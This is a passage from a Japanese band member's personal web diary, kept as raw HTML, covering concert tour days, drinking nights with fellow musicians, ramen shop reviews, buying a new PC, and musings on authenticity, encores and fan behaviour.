いや、もしかしたら考えさせられているのかもしれない。<BR>

それくらい凄い音だ。<BR>

利益など何も考えず、ただ好きな音楽をやっているだけなのだろう。<BR>

そんな簡単なことだが俺達にそれができているのだろうか？<BR>

カッコつけて似たようなことをやっている、もしくは言っているだけなんじゃないか？<BR>

本物の前ではニセモノは馬脚を現す。<BR>

俺は少なくともニセモノではない。そう信じているが本当にそうなのか？<BR>

ただ本物中の本物を知らないだけなんじゃないのか？<BR>

俺は正直なところ音楽にそれほど興味がない。<BR>

ベースにもそれほど関心がない。<BR>

バンドマンであることだけに誇りを持っている。<BR>

バンドをやるためだけにベースを練習した。<BR>

ベースを弾くためだけに音楽を聴いた。<BR>

だから俺は自分のことをアーティストと思ったことは一度も無い。<BR>

ミュージシャンと思ったことも無い。<BR>

そんな自分を格好良いと思っていたし、俺達の音楽にもそれなりに満足していた。<BR>

でも、本当は自分に言い訳をつけていただけなんじゃないのか？<BR>

練習嫌いの言い訳をしているだけなんじゃないのか？<BR>

上手くならない自分の言い訳をしているだけなんじゃないのか？<BR>

本当はもっとカッコ良いベースが弾きたいくせに。<BR>

本当はもっともっとカッコ良いバンドになりたいくせに…。<BR>

いい歳して何を今更言っているんだ、俺は？<BR>

絶対もっともっと上手くなってやる！！！<BR>

もう“言い訳”なんて絶対しねえ！！！！！！！
<HR>
３月渋谷二日目</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">熱かった。<BR>

あまりに暴れすぎて始末書モノだった。<BR>

舞台監督のコタキさん、また始末書書かせてごめんね。<BR>

終了後、M・Mのラジオに飛び入り。<BR>

５分くらい喋ってこっそり帰る（笑）<BR>

その後、斎藤ネコさんが呑んでいるというので混ぜてもらう。<BR>

今日もまたまたゴキゲンで真面目な話も交えつつ盛り上がった。<BR>

楽しい一日だったな。
<HR>
３月渋谷</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">さすがNHKホール。<BR>

演奏のやりやすさは抜群だ。<BR>

Y・Aの大ボケもあったが面白かった。<BR>

終了後、某B−BバンドのTも誘って打ち上げ。<BR>

短い時間に大量に呑む。<BR>

明日もがむばるぞ！
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">ストロング汚い部屋の大掃除。<BR>

でも、やってるうちに掃除してるのか汚しているのかわからなくなってきた。<BR>

数時間の奮闘後、なんとか人の住む部屋らしくなった。<BR>

その後、斎藤ネコさんと呑みに行く。<BR>

めちゃくちゃゴキゲンで呑み歩く。<BR>

酔った勢いでいろいろな企画案が飛び出したので今後が楽しみだ。<BR>

なんかカタチにしたいなぁ。<BR>

ネコさん、よろしくです。
<HR>
３月府中</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">本番中に機材のトラブルが多発した。<BR>

なんとか無事終了したが、こんなにドキドキしたのは初めてかも。<BR>

まあ、たまにはこういうのもいいかな。…ってよくねえよ！（笑）<BR>

打ち上げ終了後、某TバンドのY君と某F＋CバンドのSと呑んだ。<BR>

気が付けば朝５時。<BR>

う〜ん、ツアーって感じが出てきたね。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">パンドラの開けてしまった箱からはありとあらゆる苦しみが飛び出しました。<BR>

嫉妬、恨み、不安、後悔、嘘、…。<BR>

人はそれらの苦しみから逃れられない運命を背負ってしまったのです。<BR>

でも、箱の中に最後に残ったものがありました。<BR>

「希望」でした。<BR>

「希望」は言いました。<BR>

<BR>

「悪いものにおしやられてつい忘れられ勝ちになるのが私です。<BR>

私はいつも人間のそばにいます。そして人間が苦しみの中から道を見つけ出す支えとなります。<BR>

ただし…<BR>

<BR>

私の存在を思い出してもらわないと私は役に立てないのです。<BR>

悪いことは思い出さなくても人の身に降りかかってきますが、私は人が私に気付いてくれないと<BR>

そばについていてあげられないのです。<BR>

だから私を忘れないでいつでも思い出してください。<BR>

そして信じてください。<BR>

私がいれば道はひらけると…。」
<HR>
３月神奈川</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">本番前に“フカヒレまん”を食べて気合を入れる。<BR>

それとシュウマイ弁当もね（笑）<BR>

今日はカップルで来ている人達が目立ったな。<BR>

幸せそうでなによりでございますな。<BR>

LIVEの後も二人で盛り上がるんだろうな。<BR>

コンニャロー！（笑）<BR>

俺様達は中華料理を満喫しましたとさ。<BR>

おしまい。←なんのこっちゃ。
<HR>
３月群馬</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">盛り上がってくれるのは結構なんだがなぁ…。って感じがした。<BR>

LIVEはもちろん良かったんだけどね。<BR>

それと演奏中に楽器に触るな！<BR>

俺様の音を止めるな。<BR>

俺様の存在を消さないでくれ…。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">ストロング汚いごみ箱のような部屋を掃除＋模様替え…。<BR>

いかん！余計汚くなったぞ！？<BR>

むむぅ、慣れないことはするもんぢゃないな。<BR>

それにしても汚いな。<BR>

ごみ箱もビックリだな（笑）
<HR>
３月宇都宮</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">「やべえ、こんなLIVE続けていたら死んじまう。」<BR>

ってくらいのLIVEだった。<BR>

でも一回やっちまったら次からもやらなきゃな。<BR>

いや、これ以上のLIVEをやるぜ！！<BR>

おぢさんをなめんなよ（笑）
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">新しいPCが届く。<BR>

さっそく接続！！！<BR>

…しかし、ISDNの設定が上手く行かない。<BR>

なんでやねん！？<BR>

６時間の奮闘のすえ、今日は諦める。<BR>

でもアナログ回線ぢゃなくなったからメールチェックが出来ない。<BR>

しょぼ〜ん。</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">某PP誌で俺様の連載が始まるぞ。<BR>

みんな見るのだ。
<HR>
３月戸田</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">すっげー二日酔い。<BR>

昨日呑んだ“どぶろく”が効いたな。<BR>

ダミアンも相当キているようだ。<BR>

今日はスタッフ入りと同じ時間に会場入り。←午前９時くらい。<BR>

インスタントラーメンを食べてもう一眠り。<BR>

昼に起きたが、全然酒が抜けない。<BR>

シャワーを浴びて目を覚ますが酒が抜けない。<BR>

結局リハで汗を流して酒を抜く。<BR>

気合を入れなおしてさあ本番だ。<BR>

<BR>

本番、無事終了。<BR>

本番直前までライヴ構成を練り直したりしたので緊張もあったが全体的にはリラックスしたいいムードだったな。<BR>

ライヴの楽しさを再確認できた。<BR>

やっぱ、俺達ってロックバンドだぜ。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">本番を明日に控え、俺様は友人でもありスタッフでもあるダミアンの家に泊まりに行く。<BR>

会場の近くにある塩ホルモンの美味い店に行くためだ。<BR>

ここの塩ホルモンがゲロウマ。<BR>

あまりに美味いので７人前も食べた。<BR>

っていうか塩ホルモンしか注文しなかった（笑）<BR>

焼肉屋でホルモンしか注文しないってのはなぁ…。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">俺様の誕生日をみんなで祝ってくれた。<BR>

リハーサル直前に突然M・Mがバースデーソングを歌い出し、巨大な花輪が運ばれた。<BR>

まるで「笑っていいとも」にでも出演したかのようだ（笑）<BR>

テレ臭かったけど嬉しかったよ。<BR>

みんなありがとね。<BR>

<BR>

コマルさんのくれた“どぶろく”が最高に美味かった。<BR>

あとダミアン、タバコありがとね。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">PS２のソフト「決戦」が面白い。<BR>

最初はやたらと長いムービーに閉口していたのだが、ストーリーが進むにつれハマってきた。<BR>

やはり戦略モノは面白い、が…。<BR>

ゲーム中とはいえ大勢の人間がまるで虫けらのごとく死んでいくのは辛い。<BR>

権力を持ったほんの一握りの人間の私欲や私怨で大勢の人間が死んでいく。<BR>

使う人間も使われる人間も知恵が足りないんだろう。<BR>

自分の幸せを考える能力に欠けている。<BR>

なんか意図的に流行りを作り出す人間と流行りに踊らされる人間の関係みたいだな。<BR>

与えられた状況やモノをそのまま使うのはイヤだ。<BR>

俺様なりの使い方を俺は自分で考えるよ。<BR>

しょせんゲームもプログラマーに与えられた遊び方だ。<BR>

だったら俺様は与えられた以上の事を感じ取るよ。
<HR>
３月俺様Birthday</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今日は俺様の二十歳の誕生日だ。<BR>

みんな祝うのだ。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">ムキーっ！！！！！！！！！<BR>

“はちべえ”が壊されたーっ！！！！！！<BR>

ぜってー殺す。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">また仲間が増えた。<BR>

末永くよろしく。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">仕事終わりでメンバーだけで食事会。<BR>

といってもみんなで飯を食うだけなんだけどね。<BR>

真面目な話からバカ話まで異常に盛り上がった。<BR>

朝日が目に染みるぜ…。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">ついにPS2を入手しちゃったのだ。<BR>

まだ電源もいれてないけどね。<BR>

でも、もうすぐツアーが始まっちゃうんだよな。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">新しいPCを買いに出かける。<BR>

今度は近所に出来た某「○○電気」だ。<BR>

ここも接客態度は良くなかったが、昨日よりはマシだったので買うことにした。<BR>

でも、入荷待ちで１ヶ月はかかるとのこと。<BR>

TOPページのリニューアルはまだまだ先のことになりそうだ。<BR>

今月中は無理だな。<BR>

俺様しょぼ〜ん。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">新しいPCを買いに某有名「○○電気」に行ってきた。<BR>

だがしかし！！あまりの接客の悪さに帰ってきた。<BR>

ちょいとデカイ店だからって調子に乗るな、バカ！<BR>

もう、二度と行かねえ！！
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今月中にNEW TOPページにしたいと思う。<BR>

一応、アイディアはあるのだ。<BR>

でもCGIとかショックウェーブなんてハイテクは使えないのであしからず（笑）
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">壊れたPCが復活しないので新しいPCを買う決心をした。<BR>

どうせならデスクトップを買おう！<BR>

最近のはHDも２０ギガもあるし。<BR>

ちなみに俺様のは２ギガ…しょぼい（笑）
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">「ビジュアル　日本の歴史」という雑誌？が面白い。<BR>

こんな教科書だったら歴史が好きになることウケアイだな。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">そろそろ卒業シーズンだな。<BR>

卒業と言えば第二ボタンだ。<BR>

以前から聞きたかったんだが、貰ったボタンはその後どうなっているんだろう？<BR>

俺様はガクランのボタンを全部（袖ボタンまで）取られたんだが、あれから１０何年…。<BR>

今どうなっているんだろう？<BR>

ボタンを貰ったことのある人は教えてちょ。
<HR>
３月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">気がつけばもう３月なのね。<BR>

早いものだ。<BR>

おっ、３月といえば俺様の誕生日だな。<BR>

さあ、俺様の二十歳の誕生日をみんなで祝うのだ（笑）
<HR>
２月某日<BR>

う〜、酒臭い。<BR>

自分の酒臭さで酔ってしまいそうだ。<BR>

酒の呑みすぎだな。<BR>

覚えているだけでも生ビール（大）、ビンビール（大瓶）５本、焼酎１升、赤ワイン１本、ジントニック？杯。<BR>

明らかに呑み過ぎてるな、俺様の内臓はどうなってるんだ？（笑）<BR>

さあ、仕事仕事。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">仕事で福岡入り。<BR>

羽田空港で生ビール（大）をひっかけてからの福岡上陸だ。<BR>

昼飯にラーメンを食べて仕事。<BR>

怒涛の“ラジオコメントまとめ録り”だ。<BR>

しかしK・Tとおバカなことを喋りまくり、プロモーションにならず（笑）<BR>

仕事終わりで友人と会う。<BR>

名古屋から博多へ転勤になった友人がいるのだ。<BR>

ソイツとそのゆかいな仲間達とで大騒ぎ。<BR>

９時間も飲みつづけた。<BR>

俺達の通った後には酒の空き瓶がゴロゴロしていた（笑）
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">おぉっ！！５０万HIT達成！！<BR>

「俺様！」を始めて一年と十ヶ月、驚異的なスピードで来訪者が増えたがここまでとは…。<BR>

俺様人気者だな（笑）<BR>

せっかくだから古い日記を読み返してみる。<BR>

う〜ん、俺様の思考回路はディープだな。<BR>

たまに壊れてるし（笑）
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">近所にある大人気のラーメン屋に初めて行く。<BR>

雑誌に何度も掲載されている店だ。<BR>

これが大して美味くない。<BR>

美味いと思って食べている人達には申し訳無いがハッキリ言ってB級だ。<BR>

真面目な仕事だということは認める。手抜きをしているようには見えなかったし。<BR>

でもそれだけじゃねぇ…。<BR>

流行っているモノを闇雲に過大評価する今の風潮はよくないと思う。<BR>

食べ物もファッションも音楽も。<BR>

コピー商品やニセモノ、類似品が増えつづけている原因を知っているかい？<BR>

本物を見極めれるヤツが減ったからさ。<BR>

俺達の作品も常に本物でありたい。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">悲しい事があった。<BR>

気持ちが落ち込んだ。暗くなった。<BR>

でも、何時間か過ぎれば笑えてしまう自分。<BR>

気がつけば腹が減っている自分。<BR>

こんな自分が俺様は大好きだ。<BR>

生きているから死ぬ。<BR>

カタチがあるから壊れる。<BR>

人間は本能でこのことを知っているんだろう。<BR>

楽しいことが笑えなくなったら変だろ？<BR>

腹が減らなくなったら病気だろ？<BR>

“ありのまま”を“ありのまま”に受け止める。<BR>

“あったモノ”を捻じ曲げて受け止めたくない。<BR>

落ち込んだフリをするような人間にはなりたくない。<BR>

無理にでも笑えるほうが素敵ぢゃないか？
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">TVって凄いな。<BR>

ウソも本当になってしまう。<BR>

（TVだけぢゃないけどね）<BR>

本当のこともウソに見えるときがある。<BR>

自分の目で見たものが実はウソだとは気づかないよな。<BR>

だから手品ってのがあるんだけどな。<BR>

TVなんて所詮、手品みたいなもんだぜ。<BR>

それを見て真実と思うか、エンターテイメントと思うかは視聴者に委ねられる。<BR>

情報社会…。怖い世の中だな。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今日も強力に寒いな。<BR>

仕方が無い、ラーメンでも食べに行くか！（笑）<BR>

近所のラーメン屋は食べ尽くしたので“はちべえ”でちょいと遠出。<BR>

以前から気になっていたラーメン屋にいく。<BR>

ここの味噌ラーメンが気になってたんだよね。<BR>

だって“北海道産○○味噌仕様”とか“当店特性卵麺使用”とか書いてんだぜ。<BR>

店に入り、味噌ラーメンを注文する。<BR>

これがまた美味い！ゲロウマ！！<BR>

美味い店はまだまだ探せばあるもんだ。</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">「夢のために私は頑張っている」<BR>

「夢を実現させるためには仕方が無い」<BR>

ウソ臭い言葉だ。<BR>

本当に夢を追うものはそんなに雄弁じゃねえんだよ。<BR>

“夢を追うフリ”をすれば全てが許されるとでも思ってんのか？<BR>

「夢」を言い訳に使うんじゃねえ。<BR>

たまたまTVを見ていてそう思っただけなんだけどね。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">しかし寒いな、寒すぎ。<BR>

こういう時はラーメンに限るな。<BR>

ということでラーメンを食べに行こう！！（笑）<BR>

たまには普通の中華料理屋のラーメンを食べたくなったのでたまたま見つけた店に入る。<BR>

久しぶりに普通の中華料理屋に入ったが、本当に普通なのね。<BR>

メニューも日本の中華料理屋らしく広東、北京、上海、四川なんでもあり。<BR>

とりあえずチャーハンとラーメンを注文した。<BR>

これが意外にイケる。<BR>

ラーメンはたいしたことないが、チャーハンがゲロウマ！<BR>

大ぶりのピーマンが入っているのだが、こいつがポイント高し。<BR>

いい店を発見した。また来よう。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今日もラーメンを食べに行った。<BR>

家の近くにあるラーメン屋だ。<BR>

ここの“練り胡麻ラーメン”は絶品なのだ。<BR>

腹も一杯になり本屋さんへ。<BR>

面白そうなのがあったから買ってきたのだ。<BR>

「マンガ　ギリシア神話」っていうヤツだ。<BR>

早速読もう。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">以前から気になっていたラーメンを食べに行く。<BR>

“見た目の悪さは日本一！”というラーメンの店だ。<BR>

本当に見た目が悪かった。<BR>

あの見た目の悪さで食欲が減退したのは確かだ。<BR>

味は悪くないんだが…麺も美味いし。←麺はここ最近では最高峰だった。<BR>

でもなんか足りないんだよな。<BR>

…よし、もう一度いってみよう。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今日は異常に緊張した。<BR>

曲の構成をむりやり変えて演奏しなければならないからだ。<BR>

それで生本番なんだから緊張もするさベイベー。<BR>

でも、なんだかんだ上手くいったんぢゃないかな？<BR>

それにしても、あの１３歳の女のコの歌声は強力だった。<BR>

“天使の歌声”の名に恥じない素晴らしい歌声だった。<BR>

体が震えたよ。<BR>

番組終了後、Sアナウンサーは曲タイトルを間違えたことをずっと謝っていた。<BR>

本来なら許されない事かもしれんが、可愛いからおぢさん許しちゃう（笑）
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">仕事を終えて原稿書き。<BR>

おおっ、俺様の原稿は面白いな。<BR>

自分で言うのもなんだが…（笑）<BR>

でも俺様だからいいのだ←バカボンのパパ風。</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">「曲に元気付けられる」というのがイマイチよくわからないところがあったんだが、<BR>

その意味がわかった気がした。<BR>

なにげに聴いていたB'ｚのアルバム（IN THE
LIFE）なんだがすごい来た。<BR>

ハートに来たんだよ。<BR>

俺達の曲で元気になってくれる人達もいるんだよな。<BR>

なんか、いまさらかも知れないけど嬉しくなった。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">仕事場近くのラーメン屋に行く。<BR>

今日は熊本ラーメンだ。<BR>

だがしかし！熊本ラーメンとは名ばかりの変なラーメンだった。<BR>

薄いとんこつスープにやけに黄色い麺。<BR>

なんだこりゃ？<BR>

俺様がっかり。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">仕事場近くの博多ラーメン屋に行く。<BR>

ここは以前からお気に入りなのだ。<BR>

もちろん“替え玉”したさ。<BR>

やっぱラーメンは美味いね。
<HR>
逃げることは必ずしも悪ではない。<BR>

どんな時でも“逃げる”という選択肢は必要なのだ。<BR>

そうでなければ“絶体絶命”になってしまう。<BR>

「三十六計逃げるにしかず」っていう諺もあるしな。<BR>

問題なのは逃げた後どうするか？なのだ。<BR>

一番ダメなのは未練を残して先に進めなくなることだ。<BR>

逃げるなら逃げ切っちまえ！<BR>

後悔するだけ後悔しきって先に進め。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今日はバレンタイン・デー。<BR>

日本中がお菓子会社に踊らされる日だ。<BR>

俺様にとって最もどうでもいい日のひとつだな。<BR>

まあ、気弱な女子がこの日をきっかけに告白の度胸がつくならそれもいいかな。<BR>

俺様には何の関係もないが（笑）<BR>

でも、どうせ踊るなら他人の決めた場所ぢゃなくて俺様は好きなときに好きな場所で踊りたいな。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">正月にお世話になった斎藤ネコさんと呑みに行く。<BR>

サシで呑むのは初めてなのだ。<BR>

ネコさんはやさしい人で、俺様のような若輩者でも普通に接してくれる。<BR>

それに、ネコさんのたまに出る暴言が大好きなのだ（笑）<BR>

しかし！俺様、ゴキゲンすぎて後半の記憶が曖昧なのだ。<BR>

俺様としたことが…反省。<BR>

ネコさん、めっちゃ楽しかったです。<BR>

また是非一緒に呑みましょう。
<HR>
他人の誹謗中傷なんか気にするな。<BR>

俺達は俺達の仲間を信じていればいい。<BR>

誰が仲間なのか見極めろ。<BR>

ハートを熱く出来る奴が俺たちの仲間だ。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">“スクート”を改造した。<BR>

今度はハンドルをBMX用のものと取り替えた。<BR>

う〜ん、イカス。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">今日は某DTバンドのライヴ。<BR>

お昼にI君抜き（彼は仕事）で軽くリハ。<BR>

本当に軽いリハだった（笑）<BR>

リハ終わりで俺様一時休憩。<BR>

ホテル近くのパチンコ屋に行く。<BR>

懐かしい台を発見！さっそく打つが惨敗。<BR>

ふてくされて昼寝。<BR>

夕方、ライヴハウスにこっそり入り、飛び入りライブの打ち合わせ。<BR>

出番まで待ち、飛び入り。<BR>

２曲を怒涛のスピードでやり、逃げる様に帰る。<BR>

やっぱライヴは楽しいよな。<BR>

その後は楽しい打ち上げ。<BR>

Dr・Hにからまれながらも楽しかった。<BR>

また一緒に遊ぼうね。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">友人に会いに新潟へ行く。<BR>

そのついでにフィルムコンサートに飛び入り。<BR>

基本的にOFFなのでちょいと酔っ払いながらの参加だ（笑）<BR>

俺様突然の出現にみんなは困惑していたようだが、楽しんでくれたようで俺様も嬉しい。<BR>

その後、俺様の熱い要望で“ふぐ”を食べにいく。<BR>

やっぱ“ふぐ”はゲロウマ。<BR>

あれはもう魚ぢゃないね。別の生き物だ（笑）<BR>

食後、某DTバンドVo・I君と合流し呑みに行く。<BR>

明日の打ち合わせをしつつボトルを空けてしまう。<BR>

さらにGｔ・A君と合流し居酒屋で朝まで呑む。<BR>

明日が楽しみだ。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">「ライヴの楽しみ方」っていうのはいろいろあると思う。<BR>

“コスプレ”もその一つだな。（他人の迷惑にならない程度の）<BR>

でも完コピする必要はないのだ。<BR>

特徴的な一部を真似るだけで充分楽しいハズなんだよ。たとえば…<BR>

M・MのメイクやK・Tの帽子、K・Mのインディアン・ジュエリーやY・Aの…ないな（笑）<BR>

俺様ならリストバンドが簡単でいいんぢゃないか？<BR>

他にもツアーTシャツやアクセサリーを着けるだけでも楽しいと思うんだよ。<BR>

俺様もモトリークルーのライヴのときはモトリーTシャツを着て行ったものだ。<BR>

俺様的には部分コスプレがおすすめだな。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">スクート熱が盛り上がっている。<BR>

しかも異常なほどだ。<BR>

今日もまたいじってしまった。タイヤの色を赤に染めたのだ。<BR>

グリップの赤とお揃いなのだ。<BR>

う〜ん、イカス。
<HR>
アンコール<BR>

アンコールは何度やればいいのだろう？<BR>

１回？２回？<BR>

いつ満足するのだろう？<BR>

俺達が満足するのか？<BR>

みんなが満足するのか？<BR>

「もう一曲だけ…」<BR>

誰が満足すればいいのだろう？<BR>

俺達か？みんなか？<BR>

１０回もやったらブーイングが起きそうだな。<BR>

でも俺には１回も１０回も同じなんだ。<BR>

「終わりたくない」「終わらせたくない」<BR>

いつもそう思う。<BR>

そう思えるステージをいつも作っている。<BR>

じゃあ、いつ終わればいいんだ？<BR>

１回や２回のアンコールをすれば終わってもいいのか？<BR>

１回や２回のアンコールは自己満足じゃないのか？<BR>

飽きてしまうアンコールに何の意味があるんだろう？<BR>

飽きられてしまうアンコールに何の意味があるんだろう？<BR>

俺は終わることで前進する。<BR>

「それは違う」というなら「いつ終わればいいのか？」教えてくれ。<BR>

全力を出し切った者に「もっともっと」という残酷さを知っているかい？<BR>

俺達にはあらかじめ用意された偽りのアンコールなんていらない…。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">仕事のため東京に戻る。<BR>

仕事終わりで遂に“スクート”をGET！！<BR>

Sステッカーを貼り、ベアリングを付け替え、グリップも交換して“俺様専用スクート”完成。<BR>

ゴキゲンで走り回る。<BR>

しばらく楽しめそうだな。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">買い物しに大須へ行く。<BR>

お目当ては“スクート”だ。<BR>

大須中を歩き回るが発見出来ず。<BR>

栄まで探し回ったが結局発見出来なかった。残念。<BR>

夜、中学の時の同級生と合流してベトナム料理を食べに行く。<BR>

これがまた美味い。<BR>

３時くらいまで大騒ぎ。<BR>

カラサワ、ビンちゃん、また遊ぼうね。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">名古屋の美味しいラーメンを探しに街に出る。<BR>

２０分ほど歩いて発見！<BR>

「第一旭」というラーメン屋に入る。<BR>

かなり濃い醤油ラーメンだったが美味い。<BR>

醤油系ではかなりオススメだな。<BR>

夕方、弟がライヴをするというので新栄のライヴハウスに行く。<BR>

リハから見させてもらったんだが、なかなか頑張っていた。<BR>

お兄ちゃんはうれしいよ（笑）<BR>

ライヴ終了後、地元の友人達と呑みに行く。<BR>

有名人だとか芸能人なんて偏見もなく馬鹿騒ぎ。<BR>

楽しかったよ、また騒ごうぜ！
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">午前中、昔お世話になったバイト先に挨拶に行く。<BR>

挨拶に行ったのにお昼ご飯までご馳走になってしまった。<BR>

なんか申し訳無い…。<BR>

でも相変わらず美味しかったです。チーフ、八重ちゃん、コダマさん、ありがとね。<BR>

本日も勢いONLYのトークが炸裂。<BR>

でも喋りすぎのK・Mはみんなに迷惑がられてた（笑）<BR>

終了後、お疲れ様の打ち上げ。<BR>

ツネさん、オオイシさん、ミズノさん、ヨシダくん、有難うございました。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">仕事で静岡に行ったあと名古屋入り。<BR>

夜中３時までの長丁場の仕事。<BR>

プロモーションとはいえ、同じ事ばかり話さなければならないのは辛い。<BR>

なのでプロモーション・トークはほとんどしなかった（笑）<BR>

でも勢いだけで喋りたおすK・Mはどうかな？←だって中身がないんだもん（笑）
<HR>
断っておくが、俺達は“</FONT><FONT SIZE="-1"
COLOR="#0000AF">許可</FONT><FONT
SIZE="-1">”なんかした覚えはないぞ。<BR>

少なくとも俺様はない。（他のメンバーは知らないが）<BR>

俺達は“</FONT><FONT SIZE="-1" COLOR="#AF0000">禁止</FONT><FONT
SIZE="-1">”していないだけだ。<BR>

じゃあ“</FONT><FONT SIZE="-1"
COLOR="#AF0000">禁止していない＝OK</FONT><FONT
SIZE="-1">”なのか？<BR>

そんな小学生以下の考えしか出来ないのか？<BR>

いちいち紙に書いて説明して「これはみんなに迷惑だから禁止します」って<BR>

やらなきゃわかんないのか？<BR>

なんでこんな当たり前のことがわかんねえのかな。<BR>

わかんねえ奴が多いから禁止事項が増えるんだな。<BR>

わかんねえ奴が多いから毎年、法律が改正されるんだな。<BR>

結局、自分達の自由を無くしてるのにな。<BR>

でもそれが“自分のせい”だなんて考えもしねえんだよな。<BR>

イイ迷惑だぜ。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">仕事前にY・Aとラーメンを食べに行く。<BR>

以前、一度行ったことがある店に入ったんだが味が変わっていた。<BR>

確実に落ちていた。<BR>

人間日々努力だな。手抜きはすぐバレる。<BR>

「美味いものを食べさせたい＝嬉しい」の気持ちがまるで無い。<BR>

“もうけ”しか考えない奴は心をなくすんだな。<BR>

自分の利益しか考えない奴はそれが自分の首を絞めていることに気がつかない。<BR>

そのうち誰もいなくなるぜ。
<HR>
２月某日</FONT></CENTER></P>

<P><CENTER><FONT SIZE="-1">強力な冷え込み。<BR>

“はちべえ”に乗るのも辛くなってきた。<BR>

そこで防寒用にバンダナを口元に巻くんだが、その姿はどう見ても強盗（笑）<BR>

どこからどう見てもワルモノにしか見えない。<BR>

イカン！俺様はヒーローのハズなのに…。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">仕事終わりで某TV局のディレクターさんと呑む。<BR>

美味しい肴を食べながら熱いトーク。<BR>

TV局ディレクターを前に「俺、TVって嫌いなんすよ」と大暴言連発（笑）<BR>

でも、すごく楽しかった。<BR>

Yさん、また呑みましょう。
<HR>
みんな、頼むからケンカしないでくれよ。<BR>

フラッシュがあったっていいじゃねえか。←</FONT><FONT
SIZE="-2">ホントはないほうが嬉しいけどね。<BR>

</FONT><FONT
SIZE="-1">俺達がそんなこと気にならねえくらいのステージを見せるからさ。<BR>

キャーキャーうるさい奴等がいても勘弁してやってくれよ。←</FONT><FONT
SIZE="-2">ホントはないほうが嬉しいけどね。<BR>

</FONT><FONT
SIZE="-1">俺達がそんな音が気にならねえくらいのハートを伝えるからさ。<BR>

だから、頼むからケンカしないでくれよ…。
<HR>
１月某日</FONT></CENTER></P>

<P><CENTER><FONT
SIZE="-1">“思い出が出来る瞬間”って感じたことがあるかい？<BR>

俺様はあるんだな。しかもハッキリとね。<BR>

長い長いツアーの最終日、最後の曲を終えて一息ついて顔を上げた瞬間。<BR>

その一瞬でいろんな事が思い出されるんだな。<BR>

もちろんそれまでに積み重ねられた“思い出”がある。<BR>

それを全部ひっくるめた“思い出”が出来あがる瞬間があるんだ。<BR>

悲しかったこと、楽しかったこと、悔しかったこと、笑ったこと、腹が立ったこと、<BR>

嬉しかったこと…。<BR>

<BR>

一つもカタチには残ってないんだよね。<BR>

でも俺様のハートにはしっかりと残っているんだよ。<BR>

もちろん、細かいことまでは覚えていないかもしれない。<BR>

曖昧な記憶もたくさんあるかもしれない。<BR>

でも、俺様は“思い出”が欲しくてやってるわけぢゃない。<BR>

結果として“思い出”になっちゃっただけなんだよね。<BR>

